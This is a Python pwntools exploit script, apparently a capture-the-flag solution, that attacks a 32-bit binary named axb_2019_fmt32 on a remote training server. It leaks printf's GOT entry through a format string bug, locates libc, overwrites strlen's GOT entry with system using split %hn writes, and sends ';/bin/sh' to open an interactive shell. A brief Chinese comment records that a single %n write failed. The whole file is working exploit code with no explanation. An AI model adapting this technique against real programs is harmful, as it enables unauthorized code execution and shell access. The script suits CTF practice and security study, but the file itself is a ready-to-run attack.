#coding:utf-8
from pwn import *
from LibcSearcher import *

context(os='linux',arch='i386',log_level='debug')

sh = process("./axb_2019_fmt32")
sh = remote("node3.buuoj.cn","27493")

please_tell_me = 0x804887D
printf_got = 0x804A014
strlen_got = 0x804A024

x = 'A' + p32(printf_got)+ '22' + '%8$s'
sh.sendafter("Please tell me:",x)

sh.recvuntil("22")
printf_addr = u32(sh.recv(4))
print(hex(printf_addr))

libc = LibcSearcher('printf',printf_addr)
libc_base = printf_addr - libc.dump('printf')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

high_sys = (system_addr >> 16) & 0xffff
low_sys = system_addr & 0xffff
print('sys'+hex(system_addr))
print('low'+hex(low_sys))
print('high'+hex(high_sys))

x = 'A' + p32(strlen_got) + p32(strlen_got+2) + '%' + str(low_sys-18) +'c%8$hn' + '%' + str(high_sys - low_sys) + 'c%9$hn'
#x = 'A' + p32(strlen_got) + '%' + str(system_addr-14) + 'c%8$n' 
# 用%n写入不行，程序超时而且并没有写入，之后还是正常运行
sh.sendafter("Please tell me:",x) 


x = ';/bin/sh\x00'
sh.sendafter("Please tell me:",x)

sh.interactive()